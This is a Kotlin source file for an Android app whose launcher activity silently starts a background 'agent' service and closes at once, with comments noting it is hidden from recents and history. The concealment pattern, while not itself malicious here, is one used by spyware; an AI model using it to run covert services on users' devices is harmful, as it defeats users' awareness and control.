package com.demon.agent

import android.app.Activity
import android.os.Bundle
import com.demon.agent.core.BootReceiver

/*
 * MainActivity — invisible launcher activity.
 * Starts the background agent service and immediately finishes.
 * The icon is hidden from recents via android:excludeFromRecents="true"
 * and android:noHistory="true" in the manifest.
 */
class MainActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        BootReceiver.startAgentService(this)
        finish()
    }
}
